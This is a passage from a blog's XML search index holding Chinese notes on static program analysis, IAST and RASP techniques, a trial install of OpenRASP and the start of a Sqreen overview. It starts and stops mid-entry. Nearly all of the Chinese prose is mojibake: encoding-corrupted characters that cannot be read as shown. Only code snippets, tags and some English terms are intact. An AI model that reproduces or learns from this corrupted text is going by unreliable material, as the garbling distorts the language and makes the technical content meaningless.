æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness-amp-completenessï¼‰"><a href="#å¯é æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness-amp-completenessï¼‰" class="headerlink" title="å¯é æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness&amp;completenessï¼‰"></a>å¯é æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness&amp;completenessï¼‰</h1><p>è±æ–¯å®šç†è¯´æ˜äº†ä¸å¯åˆ¤å®šæ€§ï¼Œåœ¨å®é™…åˆ†ææ—¶åªèƒ½åšmayæˆ–è€…mustçš„åˆ†æï¼Œåˆ†ææ—¶å‡ºç°soundå’Œcompleteæƒ…å†µï¼Œå­˜åœ¨ä¸¤ç§å¦¥åæ–¹æ¡ˆï¼š</p><ul><li>Compromise soundnessï¼šå¦¥åå¯é æ€§ï¼Œå³æ¥å—è¯¯æŠ¥ï¼ˆmayï¼‰ï¼Œè¯¥æ–¹æ¡ˆæ˜¯é™æ€åˆ†æè¾ƒå¸¸è§</li><li>Compromise completenessï¼šå¦¥åå®Œå¤‡æ€§ï¼Œå³æ¥å—æ¼æŠ¥ï¼ˆmustï¼‰</li></ul><p>è¯¯æŠ¥ï¼ˆFalse positiveï¼‰ä¸æ¼æŠ¥ï¼ˆFalse negativeï¼‰å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802115612020.png" alt="image-20200802115612020"></p><h1 id="ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹"><a href="#ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹" class="headerlink" title="ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹"></a>ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹</h1><p>åˆ†æåœ¨ä»£ç på¤„å˜é‡vçš„æ­£è´Ÿ(+, -, 0)ã€‚</p><h2 id="å®šä¹‰æ•°æ®æŠ½è±¡"><a href="#å®šä¹‰æ•°æ®æŠ½è±¡" class="headerlink" title="å®šä¹‰æ•°æ®æŠ½è±¡"></a>å®šä¹‰æ•°æ®æŠ½è±¡</h2><ul><li>$+$ï¼šæ­£</li><li>$-$ï¼šè´Ÿ</li><li>$0$ï¼šé›¶</li><li>$\top$ï¼šæœªçŸ¥</li><li>$\perp$ï¼šæœªå®šä¹‰</li></ul><h2 id="å®šä¹‰Transfer-Function"><a href="#å®šä¹‰Transfer-Function" class="headerlink" title="å®šä¹‰Transfer Function"></a>å®šä¹‰Transfer Function</h2><p>å³è¯»å–ä¸€ä¸ªäºŒå…ƒæ“ä½œstatementsï¼Œè¾“å‡ºç¬¦å·æ˜¯ä»€ä¹ˆï¼Œå¦‚ä¸‹è¡¨ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802154058197.png" alt="image-20200802154058197"></p><h2 id="å®šä¹‰Control-Flow-Merge"><a href="#å®šä¹‰Control-Flow-Merge" class="headerlink" title="å®šä¹‰Control Flow Merge"></a>å®šä¹‰Control Flow Merge</h2><p>åœ¨CFGä¸­æ±‡èšç‚¹ä¸­è¦åˆå¹¶æƒ…å†µ<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802154239519.png" alt="image-20200802154239519"></p><h1 id="ç¼–è¯‘å™¨vs-é™æ€åˆ†æå™¨"><a href="#ç¼–è¯‘å™¨vs-é™æ€åˆ†æå™¨" class="headerlink" title="ç¼–è¯‘å™¨vs.é™æ€åˆ†æå™¨"></a>ç¼–è¯‘å™¨vs.é™æ€åˆ†æå™¨</h1><ul><li><p>ç¼–è¯‘å™¨ï¼š<br>è¯æ³•åˆ†æï¼ˆäº§ç”Ÿtokensï¼‰â†’è¯­æ³•åˆ†æï¼ˆäº§ç”ŸASTï¼‰â†’è¯­ä¹‰åˆ†æï¼ˆåŒ…æ‹¬ç±»å‹æ£€æŸ¥ï¼Œäº§ç”ŸDecorated ASTï¼‰â†’ç¿»è¯‘ï¼ˆäº§ç”ŸIRï¼‰â†’ä»£ç ç”Ÿæˆ </p></li><li><p>é™æ€åˆ†æï¼š<br>é™æ€åˆ†æåŸºäºIR</p></li></ul><h1 id="ASTå’ŒIR"><a href="#ASTå’ŒIR" class="headerlink" title="ASTå’ŒIR"></a>ASTå’ŒIR</h1><h2 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h2><ol><li>ç¬¦åˆè¯­æ³•ç»“æ„</li><li>ä¾èµ–äºç‰¹å®šè¯­è¨€</li><li>é€‚åˆäºç±»å‹æ£€æŸ¥</li><li>ç¼ºå¤±æ§åˆ¶æµä¿¡æ¯</li></ol><h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><ol><li>æ¥è¿‘æœºå™¨ä»£ç </li><li>è¯­è¨€æ— å…³</li><li>å«æœ‰æ§åˆ¶æµä¿¡æ¯</li></ol><h2 id="ä¸‰åœ°å€ç "><a href="#ä¸‰åœ°å€ç " class="headerlink" title="ä¸‰åœ°å€ç "></a>ä¸‰åœ°å€ç </h2><p>ä¸€ç§å¸¸ç”¨çš„IRï¼š</p><ol><li>å³ä¾§åªæœ‰ä¸€ä¸ªæ“ä½œ</li><li>æ¯ä¸€è¯­å¥æœ€å¤šæœ‰ä¸‰ä¸ªâ€œåœ°å€â€ï¼ˆåœ°å€å¯ä»¥æ˜¯å˜é‡ï¼Œå¸¸é‡ï¼‰<ul><li>$z=x\text{ }op\text{ }y$</li><li>$x=op\text{ }y$</li><li>$x=y$</li><li>$goto\text{ }L$</li><li>$if\text{ }x\text{ }goto\text{ }L$</li><li>$if\text{ }x\text{ }op\text{ }y\text{ }goto\text{ }L$</li></ul></li></ol><p>Soot ä¸­çš„ä¸‰åœ°å€ç :</p><ul><li><code>@parameter</code>ï¼šå‡½æ•°å‚æ•°</li><li><p><code>$x</code>ï¼šä¸´æ—¶å˜é‡</p></li><li><p><code>&lt;method signature&gt;</code>ï¼šç±»+è¿”å›å€¼ç±»å‹+æ–¹æ³•å+å‡½æ•°å‚æ•°ç±»å‹</p></li><li><code>&lt;init&gt;</code>ï¼šæ„é€ å‡½æ•°</li><li><code>&lt;clinit&gt;</code>ï¼šç±»åˆå§‹åŒ–å‡½æ•°ï¼ˆé™æ€å˜é‡åˆå§‹åŒ–ç­‰ï¼‰</li><li><code>invokespecial</code>ï¼šè°ƒç”¨æ„é€ å‡½æ•°ã€çˆ¶ç±»æ–¹æ³•ã€ç§æœ‰æ–¹æ³•</li><li><code>invokevirtual</code>ï¼šå®ä¾‹æ–¹æ³•è°ƒç”¨ï¼ˆvirtual dispatchï¼‰</li><li><code>invokeinterface</code>ï¼šä¸èƒ½ä¼˜åŒ–ã€è°ƒç”¨æ¥å£ã€æ£€æŸ¥æ¥å£å®ç°</li><li><code>invokestatic</code>ï¼šè°ƒç”¨é™æ€æ–¹æ³•</li><li><code>invokedynamic</code>ï¼šè¿è¡Œå…¶ä»–åŠ¨æ€è¯­è¨€ </li></ul><h2 id="SSA"><a href="#SSA" class="headerlink" title="SSA"></a>SSA</h2><p>ä¸€ç§ç‰¹æ®Šçš„ä¸‰åœ°å€ç :</p><ul><li>æ¯æ¬¡èµ‹å€¼æœ‰æ–°çš„å˜é‡å</li><li>æ¯ä¸€ä¸ªå˜é‡éƒ½æœ‰å”¯ä¸€å®šä¹‰</li></ul><p>ä¼˜åŠ¿ï¼š</p><ul><li>flow-insensitive analysisæ›´å‡†ç¡®</li><li>å®¹æ˜“åšä¼˜åŒ–ç®—æ³•</li></ul><p>åŠ£åŠ¿ï¼š</p><ul><li>å¼•å…¥å¤§é‡å˜é‡</li><li>ç¼–è¯‘æ—¶æœ‰æ€§èƒ½é—®é¢˜</li></ul><h1 id="Control-Flow-Graph"><a href="#Control-Flow-Graph" class="headerlink" title="Control Flow Graph"></a>Control Flow Graph</h1><p>Basic Blockæ˜¯CFGçš„ä¸»ä½“ã€‚</p><ul><li>Basic Blockï¼šä¸€ä¸ªæœ€é•¿çš„è¯­å¥åºåˆ—ï¼Œå¹¶ä¿è¯å…¥å£åªèƒ½åœ¨æœ€å¼€å§‹æŒ‡ä»¤ä¸”å‡ºå£åªèƒ½åœ¨æœ€åä¸€ä¸ªæŒ‡ä»¤</li></ul><h2 id="æ„é€ Basic-Blocks"><a href="#æ„é€ Basic-Blocks" class="headerlink" title="æ„é€ Basic Blocks"></a>æ„é€ Basic Blocks</h2><ul><li>Inputï¼šç¨‹åºPçš„ä¸‰åœ°å€ç åºåˆ—</li><li><p>Outputï¼šç¨‹åºPçš„basic blocks</p></li><li><p>ç®—æ³•</p><ol><li><p>ç¡®å®šleadersï¼ˆæ¯ä¸ªbasic blockçš„å¤´ï¼‰</p><ul><li>åºåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªæŒ‡ä»¤</li><li>è·³è½¬æŒ‡ä»¤çš„ç›®æ ‡æŒ‡ä»¤</li><li>è·³è½¬æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤</li><li>returnæŒ‡ä»¤</li></ul></li><li><p>æ¯ä¸ªBasic BlockåŒ…å«å…¶leaderè‡³ä¸‹ä¸€ä¸ªleaderå‰çš„æ‰€æœ‰è¯­å¥</p></li></ol></li></ul><h2 id="æ„é€ CFG"><a href="#æ„é€ CFG" class="headerlink" title="æ„é€ CFG"></a>æ„é€ CFG</h2><ul><li>æ·»åŠ è¾¹ï¼Œåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹ï¼š<ul><li>ä»£ç å—å­˜åœ¨å…ˆåé¡ºåºï¼Œä¸”ä¸å­˜åœ¨æ— æ¡ä»¶è·³è½¬</li><li>æ¯ä¸ªè·³è½¬é—´</li></ul></li><li>æ·»åŠ entryå’ŒexitèŠ‚ç‚¹</li></ul>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
            <tag> æ•°æ®æµåˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•</title>
      <link href="/iast-%E6%82%AC%E9%95%9C%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E7%81%B0%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
      <url>/iast-%E6%82%AC%E9%95%9C%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E7%81%B0%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>æ‚¬é•œçš„ä¸€ä¸ªæŠ€æœ¯åˆ†äº«ä¼šï¼Œå¤§è‡´è®²äº†ä¸‰ç§IASTçš„å®ç°ï¼Œè¿™é‡Œåšä¸€ä¸ªç¬”è®°æ€»ç»“ã€‚</p><h1 id="IASTç®€ä»‹"><a href="#IASTç®€ä»‹" class="headerlink" title="IASTç®€ä»‹"></a>IASTç®€ä»‹</h1><p>IAST (Interactive Application Security Testing) ä¹Ÿå«ç°ç›’æµ‹è¯•ï¼Œå³ä»‹äºç™½ç›’å’Œé»‘ç›’ä¹‹é—´çš„ä¸€ç§æµ‹è¯•ï¼Œè¿™ä¸€åœºæ™¯ä¸‹çš„æŠ€æœ¯ä¸ä½†å…³æ³¨ç¨‹åºè¾“å…¥è¾“å‡ºä¿¡æ¯ï¼ˆåƒé»‘ç›’ç¨‹åºé‚£æ ·ï¼‰ï¼Œè¿˜å¯ä»¥ï¼ˆæ³¨æ„åªæ˜¯å¯ä»¥ï¼Œåé¢ä¼šç»†è¯´ï¼‰äº†è§£éƒ¨åˆ†ç¨‹åºå†…éƒ¨é€»è¾‘ï¼ˆåƒç™½ç›’æµ‹è¯•é‚£æ ·ï¼‰ã€‚å› æ­¤å…·å¤‡é»‘ç™½ç›’æµ‹è¯•çš„ä¼˜ç‚¹ï¼Œè¢«è®¤ä¸ºæ˜¯ä¸‹ä¸€ä»£å®‰å…¨æ‰«ææŠ€æœ¯ï¼Œè¢«å„ä¸ªè¡Œä¸šæ‰€å…³æ³¨ã€‚è®¸å¤šé»‘ç™½ç›’æµ‹è¯•æŠ€æœ¯ç¨åŠ æ”¹é€ å’Œç»“åˆï¼Œå°±å¯ä»¥å˜ä¸ºç°ç›’æµ‹è¯•æŠ€æœ¯ã€‚</p><a id="more"></a><p><img src="/iast-æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•/InkedImage-1592125628662_LI.jpg" alt="Image"></p><h2 id="ä¸RASPçš„å…³ç³»"><a href="#ä¸RASPçš„å…³ç³»" class="headerlink" title="ä¸RASPçš„å…³ç³»"></a>ä¸RASPçš„å…³ç³»</h2><p>RASPï¼ˆRuntime Application Self-protectionï¼‰æ˜¯æŒ‡åœ¨ç¨‹åºè¿è¡Œæ—¶å¯¹ç¨‹åºè¡Œä¸ºè¿›è¡Œä¿æŠ¤ï¼Œå¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªç²¾ç¡®åˆ°å‡½æ•°çº§åˆ«çš„WAFï¼Œä¸ªäººè®¤ä¸ºRASPæ˜¯IASTçš„ä¸€éƒ¨åˆ†ï¼Œä¸¤è€…ä½¿ç”¨çš„æŠ€æœ¯æ˜¯æœ‰é‡å çš„ï¼Œæ¯”å¦‚è¯´åæ–‡æåˆ°çš„åŸºäºæ’æ¡©çš„IASTå®ç°ã€‚</p><h1 id="IASTåˆ†ç±»"><a href="#IASTåˆ†ç±»" class="headerlink" title="IASTåˆ†ç±»"></a>IASTåˆ†ç±»</h1><p>åœ¨å¤§æ–¹å‘ä¸Šï¼Œä¸»è¦æœ‰ä¸¤ç§ï¼Œè€Œåœ¨æ’æ¡©æŠ€æœ¯å®ç°æ—¶åˆä¼šæœ‰åˆ†æ”¯ï¼š</p><ul><li>åŸºäºæµé‡</li><li>åŸºäºæ’æ¡©<ul><li>ä¸»åŠ¨å‹IAST</li><li>è¢«åŠ¨å‹IAST</li></ul></li></ul><h2 id="åŸºäºæµé‡çš„IAST"><a href="#åŸºäºæµé‡çš„IAST" class="headerlink" title="åŸºäºæµé‡çš„IAST"></a>åŸºäºæµé‡çš„IAST</h2><p>åŸºäºæµé‡çš„IASTæ˜¯æŒ‡é€šè¿‡çˆ¬è™«+è¢«åŠ¨å¼é»‘ç›’æ‰«æå™¨å®ç°çš„IASTæŠ€æœ¯ï¼Œæ¯”å¦‚è¯´crawlergo+xrayçš„é…ç½®ï¼Œè¿™ç±»æŠ€æœ¯çš„ä¸»è¦ä¼˜åŠ¿åœ¨äºï¼š</p><ol><li><p>åŸºäºç°æˆæŠ€æœ¯ï¼Œæ”¹é€ ç®€å•</p></li><li><p>ä¸é™è¯­è¨€ï¼ŒæŠ€æœ¯é€šç”¨</p></li><li><p>æ‰«ææŠ¥å‘Šå¯ä»¥ç›´æ¥ç”¨äºæ¼æ´éªŒè¯å’Œåˆ©ç”¨</p></li><li><p>ç›¸è¾ƒäºæ’æ¡©èƒ½æ‰«ææ›´å¤šç±»å‹æ¼æ´ï¼ˆå¦‚BACï¼‰</p></li></ol><h2 id="åŸºäºæ’æ¡©çš„IAST"><a href="#åŸºäºæ’æ¡©çš„IAST" class="headerlink" title="åŸºäºæ’æ¡©çš„IAST"></a>åŸºäºæ’æ¡©çš„IAST</h2><p>åŸºäºæ’æ¡©çš„IASTä¸»è¦æ˜¯åˆ©ç”¨ä»£ç æ’æ¡©æŠ€æœ¯ï¼Œåœ¨ç›®æ ‡åº”ç”¨çš„å…³é”®ç±»ã€æ–¹æ³•ä¸­æ’å…¥æ£€æµ‹é€»è¾‘ï¼Œå¦‚åœ¨Javaä¸­ï¼Œå¯ä»¥ç”¨å­—èŠ‚ç æ“ä½œæ¡†æ¶ï¼ˆå¦‚ï¼šASMã€Javaassistã€Aspectjç­‰ï¼‰ä¿®æ”¹ç±»å’Œæ–¹æ³•ï¼Œé€šè¿‡ç¨‹åºåé¦ˆæ£€æµ‹ç¨‹åºæ¼æ´ï¼Œè¿™ç±»æŠ€æœ¯çš„ä¼˜åŠ¿åœ¨äºï¼š</p><ol><li>æ— éœ€é‡æ”¾ã€æ— è„æ•°æ®</li><li>æ›´é«˜çš„å‡†ç¡®æ€§</li><li>è§£å†³ç­¾åæ ¡éªŒã€é™åˆ¶æ•°æ®é‡æ”¾ç­‰é—®é¢˜</li></ol><h3 id="ä¸»åŠ¨å‹IAST"><a href="#ä¸»åŠ¨å‹IAST" class="headerlink" title="ä¸»åŠ¨å‹IAST"></a>ä¸»åŠ¨å‹IAST</h3><p>ä¸»åŠ¨å‹IASTæ˜¯æŒ‡ä»ç„¶ä¿ç•™é»‘ç›’æ‰«æå™¨ï¼Œåªåœ¨å®‰å…¨æ•æ„Ÿå‡½æ•°ï¼ˆæ±¡ç‚¹åˆ†æä¸­çš„sink ï¼‰ä¸Šæ’æ¡©ï¼Œé€šè¿‡æ£€æµ‹å‡½æ•°å‚æ•°æ˜¯å¦æ˜¯é¢„å®šä¹‰çš„payloadï¼Œæ£€æŸ¥ç¨‹åºæ˜¯å¦æœ‰æ¼æ´ï¼Œå¦‚ä¸‹å›¾ï¼Œagentç«¯å¯ä»¥æ£€æµ‹åˆ°æ‰«æå™¨å‘æ¥çš„payloadå·²ç»ä½œä¸º<code>executeQuery()</code>çš„å‚æ•°ï¼Œå› æ­¤æŠ¥å‘Šæ¼æ´ï¼Œæˆ–æ˜¯æ‹¦æˆªï¼ˆRASPï¼‰ã€‚æ’æ¡©ç¨‹åºå¯ä»¥åŒæ—¶æ‹¿åˆ°è¿”å›å‡½æ•°è°ƒç”¨æ ˆã€ä»£ç è¡Œå·ä»¥åŠè¯·æ±‚æ•°æ®ã€‚</p><p><img src="/iast-æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•/Image.png" alt="ä¸»åŠ¨å‹IAST"></p><h3 id="è¢«åŠ¨å‹IAST"><a href="#è¢«åŠ¨å‹IAST" class="headerlink" title="è¢«åŠ¨å‹IAST"></a>è¢«åŠ¨å‹IAST</h3><p>è¢«åŠ¨å‹IASTæ˜¯æŒ‡ä½¿ç”¨åŠ¨æ€æ±¡ç‚¹åˆ†ææŠ€æœ¯ï¼Œä¸éœ€è¦æ‰«æç«¯ï¼Œç›´æ¥åˆ¤æ–­æ•æ„Ÿå‚æ•°æ˜¯å¦ä¸ºç”¨æˆ·å¯æ§ã€‚ä¸ªäººè®¤ä¸ºæ˜¯æŠ€æœ¯éš¾åº¦æœ€é«˜çš„ä¸€ç§IASTï¼Œå› ä¸ºæ’æ¡©ç¨‹åºéœ€è¦å®ç°åŠ¨æ€æ±¡ç‚¹åˆ†æé€»è¾‘ï¼Œå®æ—¶ç›‘æ§ç¨‹åºæ±¡ç‚¹æ•°æ®å˜åŒ–ï¼Œæ£€æµ‹æ±¡ç‚¹æ˜¯å¦ç”±sourceä¼ æ’­åˆ°sinkç‚¹ã€‚</p><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œé€šè¿‡æ±¡ç‚¹åˆ†æï¼Œç”¨æˆ·äº§ç”Ÿçš„è¾“å…¥å¯ä»¥ç›´æ¥äº§ç”Ÿæ¼æ´æŠ¥å‘Šï¼š</p><p><img src="/iast-æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•/Image-1592125395631.png" alt="è¢«åŠ¨å‹IAST"></p><p>è¢«åŠ¨å‹IASTçš„å¥½å¤„åœ¨äºå…¶å®Œå…¨ä¸ä¼šå½±å“æ­£å¸¸ä¸šåŠ¡ï¼Œå¹¶ä¸”å¤§å¤§æé«˜æ‰«æè¦†ç›–ç‡ï¼Œç„¶è€Œä¸ªäººè®¤ä¸ºåŠ¨æ€æ±¡ç‚¹ä¼ æ’­ä¹Ÿä¼šæœ‰è¿‡æ±¡æŸ“å’Œæ¬ æ±¡æŸ“é—®é¢˜ï¼Œå¹¶ä¸”å…¶æœ¬èº«å¹¶ä¸èƒ½å¾ˆå¥½çš„å¤„ç†åˆ†æ”¯è¦†ç›–é—®é¢˜ï¼Œå¯ä»¥è¯´åœ¨è¿™ä¸€æ–¹é¢è¿˜å­˜åœ¨ç€è¯¸å¤šæŒ‘æˆ˜ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åˆ†äº«ä¼šå› ä¸ºæœ‰äº›æ¶‰åŠåˆ°æŠ€æœ¯ç»†èŠ‚ï¼Œå¤§ä½¬è¿˜æ˜¯æœ‰æ‰€ä¿ç•™ï¼Œä¸è¿‡å¤§è‡´ç†æ¸…æ¥šäº†IASTçš„ä¸‰å¤§å·¥ä½œæ¨¡å¼å’Œå¯¹åº”çš„æŠ€æœ¯ï¼Œç®—æ˜¯ä¸€æ¬¡ç§‘æ™®æ€§çš„åˆ†äº«ï¼Œæ„Ÿè°¢å®æˆˆå¤§ä½¬ï¼</p>]]></content>
      
      
      <categories>
          
          <category> IAST </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IAST </tag>
            
            <tag> RASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASPåˆæ¢</title>
      <link href="/iast-OpenRASP%E5%88%9D%E6%8E%A2/"/>
      <url>/iast-OpenRASP%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<p>OpenRASPæ˜¯ä¸€ç§è¾ƒä¸ºæˆç†Ÿçš„RASPæŠ€æœ¯å¼€æºå®ç°ï¼ŒæŠ€æœ¯æ€è·¯ä¸»è¦æ˜¯ä¸Šä¸€ç¯‡æ–‡ç« ä¸­çš„ä¸»åŠ¨å‹RASPåŸç†ï¼Œè¯¦ç»†å¯ä»¥è§<a href="https://rasp.baidu.com/doc/hacking/architect/hook.html?from=openrasp_internals" target="_blank" rel="noopener">hookå‡½æ•°åˆ—è¡¨</a>ï¼ˆå•†ä¸šç‰ˆæœ‰åŠ¨æ€æ±¡ç‚¹è¿½è¸ªï¼‰ï¼Œæœ¬æ–‡ä¸ºè¯•ç”¨æŠ¥å‘Šï¼Œä¹‹åæœ‰æ—¶é—´ä¼šæ·±å…¥çœ‹çœ‹ä»£ç ã€‚</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><h2 id="å®‰è£…åå°"><a href="#å®‰è£…åå°" class="headerlink" title="å®‰è£…åå°"></a>å®‰è£…åå°</h2><ol><li><p>å®‰è£…MongoDBå’ŒElasticSearchï¼ˆ5.6~6ï¼‰</p></li><li><p>åœ¨<a href="https://packages.baidu.com/app/openrasp/release/latest/" target="_blank" rel="noopener">https://packages.baidu.com/app/openrasp/release/latest/</a>ä¸‹è½½<code>rasp-cloud.tar.gz</code></p></li><li><p>è§£å‹å¹¶é…ç½®<code>conf/app.conf</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[prod]</span><br><span class="line">EsAddr = http://127.0.0.1:9200</span><br><span class="line">EsUser =</span><br><span class="line">EsPwd =</span><br><span class="line">MongoDBAddr = 127.0.0.1:27017</span><br><span class="line">MongoDBUser =</span><br><span class="line">MongoDBPwd =</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨<code>./rasp-cloud -d</code>ï¼Œç”¨æˆ·åå¯†ç ä¸º<code>openrasp::admin@123</code>ï¼Œåå°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/iast-OpenRASPåˆæ¢/image-20200629161638149.png" alt="image-20200629161638149"></p></li></ol><a id="more"></a><h2 id="å®‰è£…agent"><a href="#å®‰è£…agent" class="headerlink" title="å®‰è£…agent"></a>å®‰è£…agent</h2><p>è¿™é‡Œåªä½¿ç”¨Spring Bootçš„ç”¨æ³•ï¼š</p><ol><li><p>åŠè‡ªåŠ¨åŒ–å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar RaspInstall.jar -nodetect -install &lt;project_target&gt;  -heartbeat 90 -appid &lt;id&gt; -appsecret &lt;secret&gt; -backendurl &lt;url&gt;</span><br></pre></td></tr></table></figure></li><li><p>é‡å¯Spring Boot</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:/mnt/d/java-sec-code/target/rasp/rasp.jar  -jar /mnt/d/java-sec-code/target/java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸»æœºä¸Šçº¿ï¼š</p><p><img src="/iast-OpenRASPåˆæ¢/image-20200629165551559.png" alt="image-20200629165551559"></p></li></ol><h1 id="åŠŸèƒ½ä½¿ç”¨"><a href="#åŠŸèƒ½ä½¿ç”¨" class="headerlink" title="åŠŸèƒ½ä½¿ç”¨"></a>åŠŸèƒ½ä½¿ç”¨</h1><p>ä¸»è¦æ‹¿Java-sec-codeè¯•ç”¨äº†ä¸€ä¸‹ï¼Œæ•ˆæœè¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œé™¤äº†ä¸€ä¸ªPathTraversalæ²¡æ£€æŸ¥å‡ºæ¥ï¼Œå…¶ä»–çš„éƒ½æŸ¥åˆ°äº†ï¼š</p><p><img src="/iast-OpenRASPåˆæ¢/image-20200629170641757.png" alt="image-20200629170641757"></p><p>è‡³äºé‚£ä¸ªpathtranversalæ²¡æŸ¥å‡ºæ¥çš„é—®é¢˜åé¢å¯ä»¥å†çœ‹ä¸€ä¸‹ã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li>OpenRASPå®˜ç½‘ï¼Œ<a href="https://rasp.baidu.com/" target="_blank" rel="noopener">https://rasp.baidu.com/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> IAST </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IAST </tag>
            
            <tag> RASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqreenåˆæ¢</title>
      <link href="/iast-Sqreen%E5%88%9D%E6%8E%A2/"/>
      <url>/iast-Sqreen%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.sqreen.com/" target="_blank" rel="noopener">Sqreen</a> ä½œä¸ºä¸€æ¬¾IASTäº§å“ï¼Œç”¨æˆ·åœ¨é¡¹ç›®ä¸­å¯¼å…¥ä»–ä»¬çš„agentï¼Œä¹‹åå¯åœ¨æ§åˆ¶å°æŸ¥çœ‹æ£€æµ‹åˆ°çš„å®‰å…¨é£é™©ï¼Œå¹¶è¿›è¡Œé˜²å¾¡ï¼ˆRASPï¼‰ã€‚</p><h1 id="æŠ€æœ¯ä»‹ç»"><a href="#æŠ€æœ¯ä»‹ç»" class="headerlink" title="æŠ€æœ¯ä»‹ç»"></a>æŠ€æœ¯ä»‹ç»</h1><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒSqreenä¸»è¦ç”±ä¸‰ä¸ªç»„ä»¶ç»„æˆï¼ŒMicroAgentã€Security Engineå’ŒSqreen Platformï¼ŒSecurity Engineéƒ¨ç½²äºMicroAgentå†…éƒ¨ï¼Œå¼€å‘è€…åªè¦åœ¨å¯åŠ¨åº”ç”¨æ—¶å€’å…¥MicroAgentå³å¯ï¼ŒPlatformä¸»è¦ç”¨äºæ¥æ”¶Agentä¿¡æ¯å¹¶ä¸”å¯è§†åŒ–ç»™ç”¨æˆ·ã€‚</p><a id="more"></a><p><img src="/iast-Sqreenåˆæ¢/how-it-works-together-1.png" alt="img"></p><p>å¯è§MicroAgentæ˜¯å…¶ä¸»è¦éƒ¨ä»¶ï¼Œä¸»è¦æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ul><li>åŠ¨æ€æ’æ¡©</li><li>ç›‘æ§ç¨‹åºå¹¶æ”¶é›†ä¿¡æ¯</li><li>æ ¹æ®å®‰å…¨å¼•æ“æŒ‡ç¤ºæ‰§è¡Œå®‰å…¨å“åº”</li><li>ä¸Platformé€šä¿¡</li></ul><h1 id="é˜²å¾¡æŠ€æœ¯"><a href="#é˜²å¾¡æŠ€æœ¯" class="headerlink" title="é˜²å¾¡æŠ€æœ¯"></a>é˜²å¾¡æŠ€æœ¯</h1><p>ä»ä¸‹å›¾å¯ä»¥çœ‹åˆ°Sqreenä½¿ç”¨å¤šå±‚æ¬¡ä¿æŠ¤åº”ç”¨ç¨‹åºï¼Œè¿™é‡Œä¸»è¦ä»‹ç»In-App WAF å’Œ RASPã€‚</p><p><img src="/iast-Sqreenåˆæ¢/defense-in-depth.png" alt="img"></p><h2 id="In-App-WAF"><a href="#In-App-WAF" class="headerlink" title="In-App WAF"></a>In-App 